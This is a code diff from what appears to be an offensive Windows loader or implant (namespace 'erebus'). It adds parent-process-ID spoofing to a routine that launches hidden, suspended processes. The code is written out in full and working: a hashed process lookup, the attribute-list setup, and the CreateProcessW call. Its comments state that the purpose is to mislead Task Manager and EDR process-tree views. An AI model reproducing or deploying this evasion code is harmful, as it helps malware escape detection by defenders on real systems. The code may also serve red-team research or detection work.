@@ -150,23 +150,103 @@ namespace erebus {
 
 	BOOL CreateProcessSuspended(IN wchar_t cmd[], OUT HANDLE* process_handle, OUT HANDLE* thread_handle)
 	{
-		STARTUPINFOW startup_info = {};
 		PROCESS_INFORMATION process_info = {};
 
+#if CONFIG_PPID_SPOOF == 1
+		// PPID spoofing: inherit from a chosen parent so Task Manager and EDR
+		// process-tree views show the spoofed process as the creator.
+		// Requires at minimum PROCESS_DUP_HANDLE on the target parent.
+		//
+		// Implementation: STARTUPINFOEXW carries an attribute list that contains
+		// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS pointing to an open handle of the
+		// chosen parent. CreateProcessW reads the attribute list at kernel entry
+		// and sets the new process's parent PID before the first thread runs.
+		//
+		// Failure path: if the spoof parent is unavailable (process exited, handle
+		// open fails), fall through to a plain CreateProcessW without spoofing.
+
+		DWORD spoof_hash[1] = { (DWORD)CONFIG_PPID_SPOOF_TARGET_HASH };
+		DWORD spoof_pid = ProcessGetPidFromHashedList(spoof_hash, 1);
+
+		HANDLE h_parent = NULL;
+		if (spoof_pid) {
+			h_parent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, spoof_pid);
+			if (!h_parent) {
+				LOG_ERROR("PPID spoof: OpenProcess(%lu) failed (Code: 0x%08lX) - falling back",
+				          spoof_pid, GetLastError());
+			}
+		} else {
+			LOG_ERROR("PPID spoof: target process not found - falling back");
+		}
+
+		if (h_parent) {
+			SIZE_T attr_size = 0;
+			InitializeProcThreadAttributeList(NULL, 1, 0, &attr_size);
+
+			LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
+				(LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(attr_size);
+			if (!attr_list) {
+				CloseHandle(h_parent);
+				goto plain_create;
+			}
+
+			if (!InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size)) {
+				erebus::HeapFree(attr_list);
+				CloseHandle(h_parent);
+				goto plain_create;
+			}
+
+			if (!UpdateProcThreadAttribute(
+				attr_list, 0,
+				PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+				&h_parent, sizeof(HANDLE),
+				NULL, NULL))
+			{
+				DeleteProcThreadAttributeList(attr_list);
+				erebus::HeapFree(attr_list);
+				CloseHandle(h_parent);
+				goto plain_create;
+			}
+
+			STARTUPINFOEXW si_ex = {};
+			si_ex.StartupInfo.cb = sizeof(STARTUPINFOEXW);
+			si_ex.lpAttributeList = attr_list;
+
+			BOOL success = CreateProcessW(
+				NULL, cmd, NULL, NULL, FALSE,
+				(CREATE_NO_WINDOW | CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT),
+				NULL, NULL,
+				&si_ex.StartupInfo,
+				&process_info);
+
+			DeleteProcThreadAttributeList(attr_list);
+			erebus::HeapFree(attr_list);
+			CloseHandle(h_parent);
+
+			if (success) {
+				LOG_INFO("PPID spoofed (PID %lu as parent)", spoof_pid);
+			}
+
+			*process_handle = process_info.hProcess;
+			*thread_handle  = process_info.hThread;
+			return success;
+		}
+
+plain_create:
+#endif // CONFIG_PPID_SPOOF
+
+		STARTUPINFOW startup_info = {};
+		startup_info.cb = sizeof(STARTUPINFOW);
+
 		BOOL success = CreateProcessW(
-			NULL,
-			cmd,
-			NULL,
-			NULL,
-			FALSE,
+			NULL, cmd, NULL, NULL, FALSE,
 			(CREATE_NO_WINDOW | CREATE_SUSPENDED),
-			NULL,
-			NULL,
+			NULL, NULL,
 			&startup_info,
 			&process_info);
 
 		*process_handle = process_info.hProcess;
-		*thread_handle = process_info.hThread;
+		*thread_handle  = process_info.hThread;
 
 		return success;
 	}
